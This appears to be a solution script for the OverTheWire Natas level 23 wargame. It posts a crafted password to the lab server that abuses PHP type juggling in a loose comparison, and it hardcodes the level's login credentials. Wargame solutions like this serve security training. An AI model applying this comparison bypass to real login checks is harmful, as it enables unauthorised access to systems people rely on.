import requests
from bs4 import BeautifulSoup

# PHP type juggling
# PHP compare the  7 == '7' as equal

username='natas23'
password='D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE'
url ="http://{}.natas.labs.overthewire.org/".format(username) #?debug=True

s = requests.Session()

data = {'passwd':'15iloveyou1'}

r = s.post(url,data=data,auth=(username,password))

sp = BeautifulSoup(r.text,'lxml')

pre = sp.find_all('pre')

print(pre[0].text)